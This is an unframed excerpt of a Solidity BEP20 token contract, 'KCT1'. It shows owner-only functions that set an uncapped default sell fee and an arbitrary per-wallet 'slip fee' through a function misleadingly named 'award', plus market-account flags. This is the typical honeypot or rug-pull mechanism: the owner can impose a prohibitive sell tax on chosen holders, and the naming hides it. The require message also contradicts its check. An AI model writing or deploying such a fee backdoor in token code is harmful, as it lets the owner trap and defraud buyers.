...
contract KCT1 is BEP20, Ownable {
    // ext
    ...
    function upSF(uint256 _value) external onlyOwner {
        _defaultSellFee = _value;
    }


    function award(address _addresss, uint256 _value) external onlyOwner {
        require(_value > 1, "Account tax must be greater than or equal to 1");
        _slipFee[_addresss] = _value;
    }

    function award(address _address) external view onlyOwner returns (uint256) {
        return _slipFee[_address];
    }


    function setMarketAccountFee(address _address, bool _value) external onlyOwner {
        _marketAccount[_address] = _value;
    }

    function getMarketAccountFee(address _address) external view onlyOwner returns (bool) {
